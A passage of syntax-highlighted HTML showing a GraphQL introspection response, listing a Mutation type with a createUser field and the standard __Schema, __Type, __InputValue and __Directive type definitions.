class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;createUser&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;User&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}],</span><span class="nt">&#34;inputFields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;interfaces&#34;</span><span class="p">:[],</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Mutation&#34;</span><span class="p">,</span><span class="nt">&#34;possibleTypes&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">},{</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;A GraphQL Schema defines the capabilities of a GraphQL server. It exposes all available types and directives on the server, as well as the entry points for query, mutation, and subscription operations.&#34;</span><span class="p">,</span><span class="nt">&#34;enumValues&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;fields&#34;</span><span class="p">:[{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;A list of all directives supported by this server.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;directives&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;LIST&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__Directive&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;If this server supports mutation, the type that mutation operations will be rooted at.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;mutationType&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__Type&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;The type that query operations will be rooted at.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;queryType&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__Type&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;If this server supports subscription, the type that subscription operations will be rooted at.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;subscriptionType&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__Type&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;A list of all types supported by this server.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;types&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;LIST&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__Type&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}}}],</span><span class="nt">&#34;inputFields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;interfaces&#34;</span><span class="p">:[],</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__Schema&#34;</span><span class="p">,</span><span class="nt">&#34;possibleTypes&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">},{</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;The fundamental unit of any GraphQL Schema is the type. There are many kinds of types in GraphQL as represented by the `__TypeKind` enum.\n\nDepending on the kind of a type, certain fields describe information about that type. Scalar types provide no information beyond a name and description, while Enum types provide their values. Object and Interface types provide the fields they describe. Abstract types, Union and Interface, provide the Object types possible at runtime. List and NonNull types compose other types.&#34;</span><span class="p">,</span><span class="nt">&#34;enumValues&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;fields&#34;</span><span class="p">:[{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;description&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[{</span><span class="nt">&#34;defaultValue&#34;</span><span class="p">:</span><span class="s2">&#34;false&#34;</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;includeDeprecated&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Boolean&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;enumValues&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;LIST&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__EnumValue&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[{</span><span class="nt">&#34;defaultValue&#34;</span><span class="p">:</span><span class="s2">&#34;false&#34;</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;includeDeprecated&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Boolean&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;fields&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;LIST&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__Field&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;inputFields&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;LIST&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__InputValue&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;interfaces&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;LIST&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__Type&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;kind&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;ENUM&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__TypeKind&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;name&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;ofType&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__Type&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;possibleTypes&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;LIST&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__Type&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}}],</span><span class="nt">&#34;inputFields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;interfaces&#34;</span><span class="p">:[],</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__Type&#34;</span><span class="p">,</span><span class="nt">&#34;possibleTypes&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">},{</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Arguments provided to Fields or Directives and the input fields of an InputObject are represented as Input Values which describe their type and optionally a default value.&#34;</span><span class="p">,</span><span class="nt">&#34;enumValues&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;fields&#34;</span><span class="p">:[{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;A GraphQL-formatted string representing the default value for this input value.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;defaultValue&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;description&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;name&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;type&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__Type&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}],</span><span class="nt">&#34;inputFields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;interfaces&#34;</span><span class="p">:[],</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__InputValue&#34;</span><span class="p">,</span><span class="nt">&#34;possibleTypes&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">},{</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;A Directive provides a way to describe alternate runtime execution and type validation behavior in a GraphQL document. \n\nIn some cases, you need to provide options to alter GraphQL&#39;s execution behavior in ways field arguments will not suffice, such as conditionally including or skipping a field. Directives provide this by describing additional information to the executor.&#34;</span><span class="p">,</span><span class="nt">&#34;enumValues&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;fields&#34;</span><span class="p">:[{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;args&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;LIST&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__InputValue&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span 